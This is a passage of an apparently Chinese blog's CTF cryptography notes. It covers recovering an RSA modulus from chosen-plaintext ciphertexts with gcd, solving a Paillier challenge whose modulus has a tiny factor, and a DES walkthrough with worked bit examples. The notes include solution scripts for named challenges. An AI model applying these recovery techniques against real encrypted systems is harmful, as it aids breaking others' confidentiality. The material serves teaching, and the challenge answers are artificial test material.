class="string">&#x27;ctfshow&#x27;</span> <span class="keyword">in</span> m:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&#x27;e = <span class="subst">&#123;e&#125;</span>&#x27;</span>)</span><br><span class="line">        <span class="built_in">print</span>(m)</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    e += <span class="number">1</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">ck=148323602760763885089965103552365001726</span></span><br><span class="line"><span class="string">ct=b&#x27;K\x19T\x9a\x93/D\xa5\xa4\x0e\xece\\9i\x88j&#123;g\xeaL\xe4\xf6S\xad\x1a\xda\xdd\xcb\xc5\xe0\x08\x8a_uL\x1bA\xef\x0e\x15z\xe0\xe8?\x0f2]&#x27;</span></span><br><span class="line"><span class="string">41666058103470588962345640003523069436</span></span><br><span class="line"><span class="string">87974072322452812802060456816244684047</span></span><br><span class="line"><span class="string">179180224211126181096539041274987715617</span></span><br><span class="line"><span class="string">162876920694220832796871083784876452522</span></span><br><span class="line"><span class="string">63761152929694183722546668522439686878</span></span><br><span class="line"><span class="string">127108093007738641972094354046766635400</span></span><br><span class="line"><span class="string">26538414660849576349306084798330618579</span></span><br><span class="line"><span class="string">11192818723856101924902980552900607917</span></span><br><span class="line"><span class="string">11687269834469407485578275151617352981</span></span><br><span class="line"><span class="string">n = 184885676198683491485339386905042942577</span></span><br><span class="line"><span class="string">e=948707</span></span><br><span class="line"><span class="string">b&#x27;ctfshow&#123;...................&#125;\x03\x03\x03&#x27;</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br></pre></td></tr></table></figure><h3 id="总结-8"><a href="#总结-8" class="headerlink" title="总结"></a>总结</h3><p>适用于不知<strong>n、e</strong>，可以自己<strong>发m且得到c</strong>的情况</p><h4 id="原理分析"><a href="#原理分析" class="headerlink" title="原理分析"></a>原理分析</h4><ol><li><p>首先发2，即：m = 2，则可得到</p><p>$c_2 = 2^e \mod n$</p></li><li><p>其次，我们再发送$2^2$，即：m=4, 则可得到:</p><p>$c4= 4^e \mod n$</p><p>为探究好两者之间的关系，不妨设$2^e = a+bn$, 则有:</p><p>$c_2=2^e \mod n = a+bn \mod n = a$</p><p>$c_4=4^e \mod n = (2^2)^e = （2^e）^2 = (a+bn)^2 = a^2+2abn+b^2n^2 = a^2 \mod n $</p><p>也即：$c_4 = a^2 + kn$, 而此时，我们构造下c2, 即：</p><p>$(c_2)^2 \mod n = a^2 \mod n $, 则： $(c2)^2 = a^2+k’n$</p><p>此时，记$A = (c2)^2 - c4=(k-k’)n = k’’n$</p><p>得到上一步后，我们再接着往下发送🙂</p></li><li><p>再则，我们发送$2^3$，即：m=8，同理，则可以得到：</p><p>$B = (c2)^3-c_8=k’’’n$</p><p><strong>好起来了！</strong></p><p>我们用$gcd(A, B)$即得到n，而保险起见，不妨多来几个($2^4、2^5···$)一起求最大公因子</p></li><li><p>防污染<br>为了防止k值污染到了n（即防止gcd得到的是 一些小数 * n），我们对得到的n简单清洗一下</p><p>（这里前提是n由两大素数p、q相乘）</p></li></ol><h3 id="代码"><a href="#代码" class="headerlink" title="代码"></a>代码</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 自己按照题目要求编写server_encode() 函数</span></span><br><span class="line"><span class="comment"># 实现传入数字后，return int(对应c)</span></span><br><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_n</span>():</span></span><br><span class="line">    nset = []</span><br><span class="line">    c2 = server_encode(<span class="number">2</span>)</span><br><span class="line">    c4 = server_encode(<span class="number">4</span>)</span><br><span class="line">    c8 = server_encode(<span class="number">8</span>)</span><br><span class="line">    nset.append(c2 * c2 - c4)</span><br><span class="line">    nset.append(c2 * c2 * c2 - c8)</span><br><span class="line">    c3 = server_encode(<span class="number">3</span>)</span><br><span class="line">    c9 = server_encode(<span class="number">9</span>)</span><br><span class="line">    c27 = server_encode(<span class="number">27</span>)</span><br><span class="line">    nset.append(c3 * c3 - c9)</span><br><span class="line">    nset.append(c3 * c3 * c3 - c27)</span><br><span class="line">    c5 = server_encode(<span class="number">5</span>)</span><br><span class="line">    c25 = server_encode(<span class="number">25</span>)</span><br><span class="line">    c125 = server_encode(<span class="number">125</span>)</span><br><span class="line">    nset.append(c5 * c5 - c25)</span><br><span class="line">    nset.append(c5 * c5 * c5 - c125)</span><br><span class="line">    n = nset[<span class="number">0</span>]</span><br><span class="line">    <span class="keyword">for</span> x <span class="keyword">in</span> nset:</span><br><span class="line">        n = gmpy2.gcd(x, n)</span><br><span class="line">    <span class="keyword">while</span> n % <span class="number">2</span> == <span class="number">0</span>:</span><br><span class="line">        n //= <span class="number">2</span></span><br><span class="line">    <span class="keyword">while</span> n % <span class="number">3</span> == <span class="number">0</span>:</span><br><span class="line">        n //= <span class="number">3</span></span><br><span class="line">    <span class="keyword">while</span> n % <span class="number">5</span> == <span class="number">0</span>:</span><br><span class="line">        n //= <span class="number">5</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;n =&#x27;</span>, n)</span><br><span class="line">    <span class="keyword">return</span> n</span><br></pre></td></tr></table></figure><h2 id="同态加密"><a href="#同态加密" class="headerlink" title="同态加密"></a>同态加密</h2><ul><li><a href="https://jayxv.github.io/2020/05/14/密码学学习笔记之paillier%20cryptosystem/">参考</a></li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> getPrime <span class="keyword">as</span> getprime ,long_to_bytes,bytes_to_long,inverse</span><br><span class="line"><span class="keyword">from</span> vanish <span class="keyword">import</span> flag</span><br><span class="line"><span class="keyword">from</span> sympy <span class="keyword">import</span> isprime,nextprime</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"></span><br><span class="line">m=bytes_to_long(flag)</span><br><span class="line">p=getprime(<span class="number">512</span>)  <span class="comment"># 酱紫写？？</span></span><br><span class="line">q=nextprime(<span class="number">512</span>)</span><br><span class="line">n=p*q</span><br><span class="line"></span><br><span class="line">r=random.randint(<span class="number">1</span>,n)</span><br><span class="line">g=random.randint(<span class="number">1</span>,n)</span><br><span class="line"></span><br><span class="line">c=(<span class="built_in">pow</span>(g,m,n*n)*<span class="built_in">pow</span>(r,n,n*n))%(n*n)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span> <span class="string">&quot;c=%d&quot;</span>%(c)</span><br><span class="line"><span class="built_in">print</span> <span class="string">&quot;n=%d&quot;</span>%(n)</span><br><span class="line"><span class="built_in">print</span> <span class="string">&quot;g=%d&quot;</span>%(g)</span><br><span class="line"></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">c=14643617840485727260687883789514337554960495078025159182484344940901600090810578182116617501128323641882943106663241094886209190199404002314247096613925999812837877843566116787148411743428714726661042213165729562285577768043368385746666607442372252641495230532588344276427261824205414379772728577442269620217619275</span></span><br><span class="line"><span class="string">n=5650215343715484415924649393302012617620686312875699289646188186788806118580423414401283971780836312947326343790326120926819026727018136169739576760024802083</span></span><br><span class="line"><span class="string">g=786539430846729749998127835613552594423101498023741082894370020014675937062722533682541592019332908209917194089077366019472368764411032602494945304850258108</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br></pre></td></tr></table></figure><p>$c = （g^m \mod n^2）*（r^n \mod n^2）\mod n^2 = g^m * r^n \mod n^2$</p><p>给c、n、g</p><blockquote><p>Paillier密码，于1999年由Pascal Paillier发明，是一种用于公钥加密的概率非对称算法。该算法具有加法同态的性质 ; 这意味着，仅给出公钥和m1、m2加密，可以计算出m1 + m2</p></blockquote><h4 id="模式1"><a href="#模式1" class="headerlink" title="模式1"></a>模式1</h4><ol><li>大素数p、q满足$gcd(pq, (p-1)*(q-1)) = 1$</li><li>$n=p\cdot q，λ = lcm(p-1, q-1) = \frac{(p-1)\cdot (q-1) }{ gcd(p-1,q-1)}$</li><li>选g,  $0&lt;g&lt;n^2$</li><li>$L(x) = \frac{x-1}{n}$</li><li>$μ = (L(g^λ \pmod {n^2} ))^{-1} \pmod n$</li><li>公钥：（n, g）</li><li>私钥：（λ，μ）</li></ol><h4 id="模式2"><a href="#模式2" class="headerlink" title="模式2"></a>模式2</h4><p>在模式1的基础上，改写g，λ，μ</p><ol><li>$g=n+1$</li><li>$λ = φ(n) = (p-1)\cdot (q-1)$</li><li>$μ = φ(n)^{-1} \pmod n$</li></ol><h4 id="加密"><a href="#加密" class="headerlink" title="加密"></a>加密</h4><ol><li><p>明文m需要满足$0≤m＜n$</p></li><li><p>选择随机 r，且满足$gcd(r,n)=1$</p></li><li><p>密文：$c=g^m⋅r^n(\mod n^2)$</p></li></ol><h4 id="解密"><a href="#解密" class="headerlink" title="解密"></a>解密</h4><p>$m = ( L( c^λ \pmod {n^2} ) \cdot μ ) \pmod n$</p><h3 id="题解-14"><a href="#题解-14" class="headerlink" title="题解"></a>题解</h3><p>分解n,得到p、q </p><p>然后跟着解密步骤解就完事了</p><p>🤔但p的bit数好像根题目不符</p><figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">import gmpy2</span><br><span class="line">import libnum</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def <span class="constructor">L(<span class="params">x</span>)</span>:</span><br><span class="line">    return (x - <span class="number">1</span>) <span class="comment">// n</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">c = <span class="number">14643617840485727260687883789514337554960495078025159182484344940901600090810578182116617501128323641882943106663241094886209190199404002314247096613925999812837877843566116787148411743428714726661042213165729562285577768043368385746666607442372252641495230532588344276427261824205414379772728577442269620217619275</span></span><br><span class="line">n = <span class="number">5650215343715484415924649393302012617620686312875699289646188186788806118580423414401283971780836312947326343790326120926819026727018136169739576760024802083</span></span><br><span class="line">g = <span class="number">786539430846729749998127835613552594423101498023741082894370020014675937062722533682541592019332908209917194089077366019472368764411032602494945304850258108</span></span><br><span class="line"># print(factor(n))</span><br><span class="line">p = <span class="number">521</span></span><br><span class="line">q = <span class="number">10844943078148722487379365438199640340922622481527253914867923583087919613398125555472713957352852807960319277908495433640727498516349589577235272092178123</span></span><br><span class="line">la = ((p - <span class="number">1</span>)<span class="operator"> * </span>(q - <span class="number">1</span>)) <span class="comment">// int(gmpy2.gcd(p - 1, q - 1))</span></span><br><span class="line">tmp = <span class="constructor">L(<span class="params">int</span>(<span class="params">pow</span>(<span class="params">g</span>, <span class="params">la</span>, <span class="params">n</span> <span class="operator">**</span> 2)</span>))</span><br><span class="line">miu = <span class="built_in">int</span>(gmpy2.invert(tmp, n))</span><br><span class="line">m = (<span class="constructor">L(<span class="params">int</span>(<span class="params">pow</span>(<span class="params">c</span>, <span class="params">la</span>, <span class="params">n</span> <span class="operator">**</span> 2)</span>)<span class="operator"> * </span>miu)) % n</span><br><span class="line">print(libnum.n2s(<span class="built_in">int</span>(m)))</span><br></pre></td></tr></table></figure><h3 id="总结-9"><a href="#总结-9" class="headerlink" title="总结"></a>总结</h3><p>同态加密基于rsa的<strong>大素数分解难题</strong>，能得到p、q又有公钥就可解</p>]]></content>
      
      
      
        <tags>
            
            <tag> Crypto </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>DES算法</title>
      <link href="/2022/04/29/DES%E7%AE%97%E6%B3%95/"/>
      <url>/2022/04/29/DES%E7%AE%97%E6%B3%95/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="DES算法学习笔记"><a href="#DES算法学习笔记" class="headerlink" title="DES算法学习笔记"></a>DES算法学习笔记</h1><blockquote><p>一般来说，DES算法中</p><p>密钥长度为64比特（实际为：56比特 + 8位校验）</p><p>DES以64比特为一个单位进行加密，称这64比特的单位为分组。</p><p>以分组为单位进行处理的密码算法称为<strong>分组密码。</strong></p></blockquote><p>这里学习、记录<strong>最为广义的DES</strong>（即：具体的操作细则、操作逻辑可以被人为改动</p><p>先附上一张完整的大图。</p><p><img src="https://cdn.jsdelivr.net/gh/Harry0597/Imag@master/uPic/1.png" alt="DES全过程"></p><p>乍一看，难免云里雾里</p><p>便从局部入手，慢慢向整体靠拢</p><h2 id="密钥处理"><a href="#密钥处理" class="headerlink" title="密钥处理"></a>密钥处理</h2><p><img src="https://cdn.jsdelivr.net/gh/Harry0597/Imag@master/uPic/2.png" alt="密钥处理"></p><p><strong>由上往下</strong>，慢慢解释。</p><h3 id="置换选择-｜-Permuted-Choice-1"><a href="#置换选择-｜-Permuted-Choice-1" class="headerlink" title="置换选择 ｜ Permuted Choice 1"></a>置换选择 ｜ Permuted Choice 1</h3><ol><li><p>（64位密钥，每8位为1组）不考虑每组的第8位，DES的密钥由<strong>64</strong>位减至<strong>56</strong>位</p><p>每个字节的第8位作为奇偶校验位，这里选择忽略之</p></li><li><p>产生的56位密钥由下表生成（表中没有8,16,24，32,40,48,56和64这8位）</p><p>生成方式为：</p><ul><li><p>表中第1位<strong>57</strong>：将原来密钥中第57位 放在 第1位</p></li><li><p>表中第2位<strong>49</strong>：将原来密钥中第49位 放在 第2位</p><p>······</p><p>从上往下，从左往右直到最后一位</p></li></ul><p><img src="https://cdn.jsdelivr.net/gh/Harry0597/Imag@master/uPic/image-20220429200503453.png" alt="PC_1"></p></li><li><p>置换后的56位密钥分成两部分 C0(<strong>28</strong>位) 和 D0(<strong>28</strong>位)</p></li></ol><h4 id="例："><a href="#例：" class="headerlink" title="例："></a>例：</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">k= 00010011 00110100 01010111 01111001 <span class="number">10011011</span> <span class="number">10111100</span> <span class="number">11011111</span> <span class="number">11110001</span></span><br><span class="line"></span><br><span class="line">根据选择置换PC-<span class="number">1</span>表将这<span class="number">64</span>位转换为<span class="number">56</span>位</span><br><span class="line">k = <span class="number">1111000</span> 0110011 0010101 0101111 0101010 <span class="number">1011001</span> <span class="number">1001111</span> 0001111</span><br><span class="line"></span><br><span class="line">将置换后的<span class="number">56</span>位密钥分成两块C0(<span class="number">28</span>位)和D0(<span class="number">28</span>位)</span><br><span class="line">C0= <span class="number">1111000</span> 0110011 0010101 0101111</span><br><span class="line">D0= 0101010 <span class="number">1011001</span> <span class="number">1001111</span> 0001111</span><br></pre></td></tr></table></figure><h3 id="循环左移-｜-Left-shift"><a href="#循环左移-｜-Left-shift" class="headerlink" title="循环左移 ｜ Left shift"></a>循环左移 ｜ Left shift</h3><ol><li>将C0和D0进行循环左移变化，变换后生成C1和D1</li><li>C1和D1合并</li></ol><h4 id="例"><a href="#例" class="headerlink" title="例:"></a>例:</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 第一步置换后的C0和D0</span></span><br><span class="line">C0= <span class="number">1111000</span> 0110011 0010101 0101111</span><br><span class="line">D0= 0101010 <span class="number">1011001</span> <span class="number">1001111</span> 0001111</span><br><span class="line"></span><br><span class="line"><span class="comment"># 循环左移一位，得到：</span></span><br><span class="line">C1= <span class="number">1110000</span> <span class="number">1100110</span> 0101010 <span class="number">1011111</span></span><br><span class="line">D1= <span class="number">1010101</span> 0110011 0011110 0011110</span><br><span class="line"></span><br><span class="line"><span class="comment"># 将左移后的C1、D1合并</span></span><br><span class="line">C1D1 = <span class="number">1110000</span> <span class="number">1100110</span> 0101010 <span class="number">1011111</span> <span class="number">1010101</span> 0110011 0011110 0011110</span><br></pre></td></tr></table></figure><p><strong>注：每轮循环左移的位数由轮数决定（见下图）</strong></p><p><img src="https://cdn.jsdelivr.net/gh/Harry0597/Imag@master/uPic/image-20220429201319833.png" alt="R"></p><h3 id="压缩置换-｜-Permuted-Choice-2"><a href="#压缩置换-｜-Permuted-Choice-2" class="headerlink" title="压缩置换 ｜ Permuted Choice 2"></a>压缩置换 ｜ Permuted Choice 2</h3><p>移动后，从<strong>56</strong>位中选出<strong>48</strong>位。</p><p>这个过程中，既置换了每位的顺序，又选择了子密钥，因此称为压缩置换。</p><ol><li><p>换PC-2表规则置换</p><p><strong>（注意表中没有9，18，22，25，35，38，43和54这8位）</strong></p><p><img src="https://cdn.jsdelivr.net/gh/Harry0597/Imag@master/uPic/image-20220429201644038.png" alt="PC_2"></p></li></ol><h4 id="例：-1"><a href="#例：-1" class="headerlink" title="例："></a>例：</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 左移后</span></span><br><span class="line">C1D1 = <span class="number">1110000</span> <span class="number">1100110</span> 0101010 <span class="number">1011111</span> <span class="number">1010101</span> 0110011 0011110 0011110</span><br><span class="line"><span class="comment"># 根据PC-2表将左移后的密钥压缩成48位</span></span><br><span class="line">K1= 000110 <span class="number">110000</span> 001011 <span class="number">101111</span> <span class="number">111111</span> 000111 000001 <span class="number">110010</span></span><br></pre></td></tr></table></figure><p>压缩置换后的<strong>48位子密钥</strong>将参与到<strong>轮操作</strong>中</p><p>而C1、D1也将再进行左移和置换后得到下一轮的子密钥</p><h2 id="明文处理"><a href="#明文处理" class="headerlink" title="明文处理"></a>明文处理</h2><p><img src="https://cdn.jsdelivr.net/gh/Harry0597/Imag@master/uPic/7.png" alt="明文处理全程"></p><p><strong>由上往下</strong>，慢慢解释。</p><h3 id="置换IP-｜-Initial-Permutation"><a href="#置换IP-｜-Initial-Permutation" class="headerlink" title="置换IP ｜ Initial Permutation"></a>置换IP ｜ Initial Permutation</h3><ol><li><p>64位明文M按如下规则重新组合</p><p><img src="https://cdn.jsdelivr.net/gh/Harry0597/Imag@master/uPic/image-20220429202049631.png" alt="初始IP"></p></li><li><p>输出分为L0、R0两部分，每部分各长<strong>32</strong>位</p></li></ol><h4 id="例-1"><a href="#例-1" class="headerlink" title="例:"></a>例:</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">M= <span class="number">0000</span> 0001 0010 0011 0100 0101 0110 0111 <span class="number">1000</span> <span class="number">1001</span> <span class="number">1010</span> <span class="number">1011</span> <span class="number">1100</span> <span class="number">1101</span> <span class="number">1110</span> <span class="number">1111</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 根据上面的置换表得到的结果</span></span><br><span class="line">IP= <span class="number">1100</span> <span class="number">1100</span> <span class="number">0000</span> <span class="number">0000</span> <span class="number">1100</span> <span class="number">1100</span> <span class="number">1111</span> <span class="number">1111</span> <span class="number">1111</span> <span class="number">0000</span> <span class="number">1010</span> <span class="number">1010</span> <span class="number">1111</span> <span class="number">0000</span> <span class="number">1010</span> <span class="number">1010</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 将置换后的结果分为两部分L0、R0</span></span><br><span class="line">L0= <span class="number">1100</span> <span class="number">1100</span> <span class="number">0000</span> <span class="number">0000</span> <span class="number">1100</span> <span class="number">1100</span> <span class="number">1111</span> <span class="number">1111</span></span><br><span class="line">R0= <span class="number">1111</span> <span class="number">0000</span> <span class="number">1010</span> <span class="number">1010</span> <span class="number">1111</span> <span class="number">0000</span> <span class="number">1010</span> <span class="number">1010</span></span><br></pre></td></tr></table></figure><h3 id="轮操作-｜-F"><a href="#轮操作-｜-F" class="headerlink" title="轮操作 ｜ F"></a>轮操作 ｜ F</h3><blockquote><p>经过置换IP后的L0、R0会经过16轮的相同操作 (<strong>F</strong>)</p><p>每一轮都会有一个<strong>密钥处理过程生成的不同子密钥</strong>参与</p></blockquote><p><img src="https://cdn.jsdelivr.net/gh/Harry0597/Imag@master/uPic/8.jpg" alt="轮操作全程"></p><p>Bring it on.</p><h4 id="扩展置换-E-table"><a href="#扩展置换-E-table" class="headerlink" title="扩展置换 | E table"></a>扩展置换 | E table</h4><blockquote><p>扩展置置换目标是IP置换后获得的右半部分R0，将<strong>32</strong>位输入扩展为<strong>48</strong>位(分为4位×8组)输出。</p></blockquote><ol><li><p>按表置换</p><p><img src="https://cdn.jsdelivr.net/gh/Harry0597/Imag@master/uPic/image-20220429203709703.png" alt="扩展置换"></p><p><strong>注：左右两边黄色就是用来扩展的</strong></p></li></ol><h5 id="例-2"><a href="#例-2" class="headerlink" title="例:"></a>例:</h5><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 明文经过置换后的右半部分如下所示</span></span><br><span class="line">R0= <span class="number">1111</span> <span class="number">0000</span> <span class="number">1010</span> <span class="number">1010</span> <span class="number">1111</span> <span class="number">0000</span> <span class="number">1010</span> <span class="number">1010</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 通过扩展规则得到如下数据</span></span><br><span class="line">E(R0)= 011110 <span class="number">100001</span> 010101 010101 011110 <span class="number">100001</span> 010101 010101</span><br></pre></td></tr></table></figure><h4 id="异或-｜-XOR"><a href="#异或-｜-XOR" class="headerlink" title="异或 ｜ XOR"></a>异或 ｜ XOR</h4><ol><li>扩展置换后产生的<strong>48</strong>位        与        对应的 在密钥处理中产生的<strong>48</strong>位<strong>子密钥</strong>异或</li></ol><h4 id="S盒置换-S-box"><a href="#S盒置换-S-box" class="headerlink" title="S盒置换 | S-box"></a>S盒置换 | S-box</h4><p>异或后得到48位的数据，将被送入S盒（<strong>6位输入4位输出</strong>）进行运算</p><p>48位输入分为8个6位的分组，一个分组对应一个S盒，对应的S盒对各组进行代替操作，最后得到32位的数据。</p><p><img src="https://cdn.jsdelivr.net/gh/Harry0597/Imag@master/uPic/image-20220429204618302.png" alt="S-box1"></p><p>一个S盒就是一个4行16列的表（<strong>见下图</strong>），盒中的每一项都是一个4位的数。</p><p><strong>S盒的6位输入确定了其对应的输出在哪一行哪一列</strong></p><p>输入的高低两位做为行数H，中间四位做为列数L，在S-BOX中查找第H行L列对应的数据</p><h5 id="例-3"><a href="#例-3" class="headerlink" title="例:"></a>例:</h5><ol><li>S盒的6位输入为101100</li><li>取最高位及最低位得到的值10转换为十进制为2</li><li>除去最高位及最低位的四位数字组成0110转换为十进制为6</li><li>S盒的输出为第2行，第6列所对应的值 2 的二进制 0010</li></ol><p><img src="https://cdn.jsdelivr.net/gh/Harry0597/Imag@master/uPic/image-20220429205011478.png" alt="S-box2"></p><h4 id="P盒置换-｜-P"><a href="#P盒置换-｜-P" class="headerlink" title="P盒置换 ｜ P"></a>P盒置换 ｜ P</h4><ol><li><p>P盒置换即按表置换</p><p><img src="https://cdn.jsdelivr.net/gh/Harry0597/Imag@master/uPic/image-20220429205545606.png" alt="P"></p></li></ol><p><strong>特点是该置换把输入的每位映射到输出位，任何一位都不会重复，也不会缺席</strong></p><h5 id="例-4"><a href="#例-4" class="headerlink" title="例:"></a>例:</h5><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 原数据</span></span><br><span class="line">0001 <span class="number">0000</span> <span class="number">1010</span> 0001 <span class="number">0000</span> <span class="number">0000</span> <span class="number">0000</span> 0001</span><br><span class="line"></span><br><span class="line"><span class="comment"># 替换后的值</span></span><br><span class="line"><span class="number">1000</span> <span class="number">0000</span> <span class="number">0000</span> <span class="number">0000</span> <span class="number">0000</span> <span class="number">1000</span> <span class="number">1000</span> 0110</span><br></pre></td></tr></table></figure><h4 id="异或-｜-XOR-1"><a href="#异或-｜-XOR-1" class="headerlink" title="异或 ｜ XOR"></a>异或 ｜ XOR</h4><p>P盒置换的结果 与 最初的64位分组<strong>左半部分L0</strong></p><p>异或得到结果为 <strong>R1</strong>， L1则等于R0 </p><p>接着开始另一轮，总共要进行<strong>16</strong>次轮操作</p><h3 id="左右32bit互换-｜-32-bit-Swap"><a href="#左右32bit互换-｜-32-bit-Swap" class="headerlink" title="左右32bit互换 ｜ 32-bit Swap"></a>左右32bit互换 ｜ 32-bit Swap</h3><p><strong>进行16次轮操作后</strong>，将L16 与 R16互换位置</p><h4 id="即"><a href="#即" class="headerlink" title="即"></a>即</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">L_ = R16</span><br><span class="line">R_ = L16</span><br></pre></td></tr></table></figure><h3 id="逆置换IP-｜-Inverse-Initial-Permutation"><a href="#逆置换IP-｜-Inverse-Initial-Permutation" class="headerlink" title="逆置换IP ｜ Inverse Initial Permutation"></a>逆置换IP ｜ Inverse Initial Permutation</h3><p>逆置换是初始置换IP的逆过程(<strong>可以好好理解一下这句话</strong></p><ol><li><p>按表置换即可</p><p><img src="https://cdn.jsdelivr.net/gh/Harry0597/Imag@master/uPic/image-20220429211911673.png" alt="逆置换IP"></p></li></ol><h4 id="例-5"><a href="#例-5" class="headerlink" title="例"></a>例</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">L_ R_= 00001010 01001100 <span class="number">11011001</span> <span class="number">10010101</span> 01000011 01000010 00110010 00110100</span><br><span class="line"></span><br><span class="line"><span class="comment"># 进行逆置换之后</span></span><br><span class="line"></span><br><span class="line">IP-<span class="number">1</span>= <span class="number">10000101</span> <span class="number">11101000</span> 00010011 01010100 00001111 00001010 <span class="number">10110100</span> 00000101</span><br></pre></td></tr></table></figure><p><strong>最后得到的即为密文。</strong></p><h2 id="梳理一下"><a href="#梳理一下" class="headerlink" title="梳理一下"></a>梳理一下</h2><ul><li><p>DES会对密钥处理，产生先后16组48位的<strong>Ki</strong></p><p><img src="https://cdn.jsdelivr.net/gh/Harry0597/Imag@master/uPic/14.jpeg" alt="密钥处理"></p></li><li><p>DES还对明文处理，使明文与Ki操作，然后产生密文<br><img src="https://cdn.jsdelivr.net/gh/Harry0597/Imag@master/uPic/15.jpeg" alt="明文处理"></p></li><li><p>总体缩略如下</p><p><img src="https://cdn.jsdelivr.net/gh/Harry0597/Imag@master/uPic/16.jpeg" alt="DES加密"></p></li></ul><p>原理讲解的最后，附上最开始的图</p><p>应该还算明了，消化一下就好</p><p><img src="https://cdn.jsdelivr.net/gh/Harry0597/Imag@master/uPic/1.png" alt="DES全过程"></p><h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><ul><li><a href="https://blog.csdn.net/qq_41610725/article/details/116758660?spm=1001.2014.3001.5506">https://blog.csdn.net/qq_41610725/article/details/116758660?spm=1001.2014.3001.5506</a></li></ul><hr><h2 id="例题"><a href="#例题" class="headerlink" title="例题"></a>例题</h2><h3 id="N1DES"><a href="#N1DES" class="headerlink" title="N1DES"></a>N1DES</h3><h3 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span 